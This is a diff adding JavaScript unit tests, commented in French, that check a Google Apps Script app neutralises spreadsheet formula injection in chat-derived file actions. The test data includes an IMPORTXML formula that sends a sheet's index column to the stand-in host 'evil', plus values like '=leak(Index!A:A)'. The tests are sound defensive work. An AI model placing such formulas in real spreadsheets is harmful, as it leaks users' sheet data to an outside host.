@@ -44,6 +44,43 @@ test('parserActionsChat_ : plafond CONFIG.REORG_ACTIONS_MAX (borne l\'écriture)
   assert.strictEqual(r.ignorees, 3);
 });
 
+test('neutraliserFormule_ : une cellule ne commence JAMAIS par un caractère de formule (revue sécurité F1)', () => {
+  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
+  // Une valeur qui débute par =/+/-/@/tab/CR est une FORMULE recalculée CÔTÉ SERVEUR par Google —
+  // `=IMPORTXML(...&JOIN(",",Index!A2:A500)...)` exfiltrerait les métadonnées de la Sheet. On préfixe.
+  for (const dangereux of ['=1+1', '=IMPORTXML("http://evil/?x="&JOIN(",",Index!A:A),"//a")', '+A1', '-2', '@x', '\t=x', '\r=y']) {
+    assert.strictEqual(c.neutraliserFormule_(dangereux)[0], "'", 'neutralisé : ' + JSON.stringify(dangereux));
+  }
+  // Une valeur BÉNIGNE (id Drive, texte normal) est INTACTE — jamais de faux positif.
+  for (const benin of ['1zFTPL9iADzjJ83F4keX2z', 'Facture Hydro 2025', '', 'a=b (pas en tête)']) {
+    assert.strictEqual(c.neutraliserFormule_(benin), benin, 'intact : ' + JSON.stringify(benin));
+  }
+});
+
+test('parserActionsChat_ : l\'injection de formule est neutralisée sur TOUS les champs de cellule (F1)', () => {
+  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
+  const r = c.parserActionsChat_([{
+    type: 'deplacer-fichier', source: '=cmd()', cible: '@x',
+    source_nom: '=leak(Index!A:A)', cible_nom: '+evil', raison: '=IMPORTXML("http://evil")',
+  }]);
+  assert.strictEqual(r.actions.length, 1);
+  const a = plat(r.actions)[0];
+  for (const champ of ['source', 'cible', 'sourceNom', 'cibleNom', 'raison']) {
+    assert.strictEqual(a[champ][0], "'", champ + ' neutralisé (jamais une formule recalculée par Google)');
+  }
+  // Un id Drive légitime traverse INTACT (l'application le résout ; un préfixe casserait le move).
+  const legit = plat(c.parserActionsChat_([{ type: 'renommer', source: '1zFTPL9iADzjJ83', nom: 'Impôts' }]).actions)[0];
+  assert.strictEqual(legit.source, '1zFTPL9iADzjJ83');
+  assert.strictEqual(legit.nom, 'Impôts');
+});
+
+test('parserActionsChat_ : source/cible sont bornés à 80 caractères (id Drive — au-delà = injection, F1)', () => {
+  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
+  const r = c.parserActionsChat_([{ type: 'deplacer', source: 'x'.repeat(500), cible: 'y'.repeat(500) }]);
+  assert.strictEqual(r.actions[0].source.length, 80);
+  assert.strictEqual(r.actions[0].cible.length, 80);
+});
+
 test('champsActionChat_ : champs requis par type ; null pour un type inconnu', () => {
   const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
   assert.deepStrictEqual(plat(c.champsActionChat_('deplacer-fichier')), { src: true, cib: true, nom: false });
